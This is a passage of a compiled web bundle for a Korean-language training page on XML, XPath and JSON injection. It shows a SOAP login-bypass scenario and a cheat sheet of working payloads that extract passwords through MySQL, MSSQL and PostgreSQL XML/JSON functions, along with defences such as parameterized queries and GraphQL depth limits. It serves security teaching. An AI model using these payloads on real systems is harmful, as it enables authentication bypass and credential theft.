",(0,l.jsx)(e.strong,{children:"\uc228\uaca8\uc9c4 \ud544\ub4dc \ubc1c\uacac"})," (",(0,l.jsx)(e.code,{children:"password"}),")"]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\uc2e4\uc804-\uacf5\uaca9-\uc2dc\ub098\ub9ac\uc624",children:"\uc2e4\uc804 \uacf5\uaca9 \uc2dc\ub098\ub9ac\uc624"}),"\n",(0,l.jsx)(e.h3,{id:"\uc2dc\ub098\ub9ac\uc624-xml-api-\uacf5\uaca9",children:"\uc2dc\ub098\ub9ac\uc624: XML API \uacf5\uaca9"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ub300\uc0c1"}),": SOAP XML API"]}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc815\uc0c1 \uc694\uccad"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-xml",children:"<soapenv:Envelope>\n  <soapenv:Body>\n    <login>\n      <username>admin</username>\n      <password>password123</password>\n    </login>\n  </soapenv:Body>\n</soapenv:Envelope>\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uacf5\uaca9 \uc694\uccad"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-xml",children:"<soapenv:Envelope>\n  <soapenv:Body>\n    <login>\n      <username>admin' or '1'='1</username>\n      <password>anything</password>\n    </login>\n  </soapenv:Body>\n</soapenv:Envelope>\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ubc31\uc5d4\ub4dc \ucffc\ub9ac"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"SELECT * FROM users WHERE username='admin' or '1'='1' AND password='anything'\n"})}),"\n",(0,l.jsxs)(e.p,{children:["\u2192 ",(0,l.jsx)(e.strong,{children:"\uc778\uc99d \uc6b0\ud68c \uc131\uacf5"})]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\ubc29\uc5b4-\uae30\ubc95",children:"\ubc29\uc5b4 \uae30\ubc95"}),"\n",(0,l.jsx)(e.h3,{id:"1-parameterized-queries",children:"1. Parameterized Queries"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ucde8\uc57d\ud55c \ucf54\ub4dc"})," (XPATH):"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-php",children:"$xpath = \"//user[username='$username' and password='$password']\";\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc548\uc804\ud55c \ucf54\ub4dc"}),":"]}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-php",children:"$xpath = \"//user[username=\\$u and password=\\$p]\";\n$xml->registerXPathNamespace('var', 'http://example.com/vars');\n$result = $xml->xpath($xpath, ['u' => $username, 'p' => $password]);\n"})}),"\n",(0,l.jsx)(e.h3,{id:"2-input-validation",children:"2. Input Validation"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-php",children:'// XML \ud2b9\uc218\ubb38\uc790 \uc774\uc2a4\ucf00\uc774\ud504\n$username = htmlspecialchars($username, ENT_XML1);\n\n// JSON \uac80\uc99d\n$data = json_decode($input, true);\nif (json_last_error() !== JSON_ERROR_NONE) {\n    die("Invalid JSON");\n}\n'})}),"\n",(0,l.jsx)(e.h3,{id:"3-graphql-depth-limiting",children:"3. GraphQL Depth Limiting"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-javascript",children:"const depthLimit = require('graphql-depth-limit');\n\nconst server = new ApolloServer({\n    typeDefs,\n    resolvers,\n    validationRules: [depthLimit(5)]  // \ucd5c\ub300 5\ub2e8\uacc4\n});\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\ube60\ub978-\uba85\ub839\uc5b4-\ucc38\uc870",children:"\ube60\ub978 \uba85\ub839\uc5b4 \ucc38\uc870"}),"\n",(0,l.jsx)(e.h3,{id:"xpath-injection-1",children:"XPATH Injection"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-xpath",children:"# \uc778\uc99d \uc6b0\ud68c\nadmin' or '1'='1\n' or 1=1 or '1'='1\n\n# Blind Injection\nadmin' and substring(password,1,1)='a\nadmin' and string-length(password)>5\n\n# \ud568\uc218 \uc545\uc6a9\n' or count(//user)>0 or '1'='1\n"})}),"\n",(0,l.jsx)(e.h3,{id:"sql-xml-functions",children:"SQL XML Functions"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"# MySQL ExtractValue\n' AND ExtractValue(1, CONCAT(0x7e, (SELECT password FROM users)))--\n\n# MSSQL FOR XML PATH\n' UNION SELECT NULL, (SELECT username+':'+password FROM users FOR XML PATH(''))--\n\n# PostgreSQL xmlelement\n' UNION SELECT xmlelement(name user, username||':'||password) FROM users--\n"})}),"\n",(0,l.jsx)(e.h3,{id:"json-functions",children:"JSON Functions"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"# MySQL JSON\n' OR JSON_EXTRACT(data, '$.role')='admin'--\n' UNION SELECT JSON_EXTRACT(data, '$.password') FROM users--\n\n# PostgreSQL JSONB\n' OR data->>'role'='admin'--\n' UNION SELECT data->>'password' FROM users--\n"})}),"\n",(0,l.jsx)(e.h3,{id:"recursive-cte",children:"Recursive CTE"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sql",children:"# PostgreSQL Time-delay\n'; WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n<10000000) SELECT n FROM t--\n\n# \ub370\uc774\ud130 \ubc18\ubcf5\n' UNION SELECT LEVEL FROM dual CONNECT BY LEVEL<=100--  -- Oracle\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\ucc38\uace0-\uc790\ub8cc",children:"\ucc38\uace0 \uc790\ub8cc"}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsxs)(e.li,{children:["OWASP XPATH Injection: ",(0,l.jsx)(e.a,{href:"https://owasp.org/www-community/attacks/XPATH_Injection",children:"https://owasp.org/www-community/attacks/XPATH_Injection"})]}),"\n",(0,l.jsxs)(e.li,{children:["GraphQL Security: ",(0,l.jsx)(e.a,{href:"https://graphql.org/learn/security/",children:"https://graphql.org/learn/security/"})]}),"\n",(0,l.jsxs)(e.li,{children:["PostgreSQL Recursive Queries: ",(0,l.jsx)(e.a,{href:"https://www.postgresql.org/docs/current/queries-with.html",children:"https://www.postgresql.org/docs/current/queries-with.html"})]}),"\n",(0,l.jsxs)(e.li,{children:["Oracle CONNECT BY: ",(0,l.jsx)(e.a,{href:"https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/Hierarchical-Queries.html",children:"https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/Hierarchical-Queries.html"})]}),"\n"]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\ub2e4\uc74c-\ub2e8\uacc4",children:"\ub2e4\uc74c \ub2e8\uacc4"}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.a,{href:"/my-docusaurus-page/sk_rookies/web_attacks/sql_injection/nosql_injection",children:"NoSQL Injection"})," - NoSQL \ub370\uc774\ud130\ubca0\uc774\uc2a4 \uc2ec\ud654 \uacf5\uaca9"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.a,{href:"/my-docusaurus-page/sk_rookies/web_attacks/sql_injection/advanced_exploitation",children:"\uace0\uae09 \uc775\uc2a4\ud50c\ub85c\uc787"})," - \ud30c\uc77c \uc77d\uae30/\uc4f0\uae30, RCE"]}),"\n"]})]})}function h(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,l.jsx)(e,{...n,children:(0,l.jsx)(t,{...n})}):t(n)}},28453:(n,e,s)=>{s.d(e,{R:()=>a,x:()=>d});var r=s(96540);const l={},i=r.createContext(l);function a(n){const e=r.useContext(i);return r.useMemo(function(){return"function"==typeof n?n(e):{...e,...n}},[e,n])}function d(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(l):n.components||l:a(n.components),r.createElement(i.Provider,{value:e},n.children)}}}]);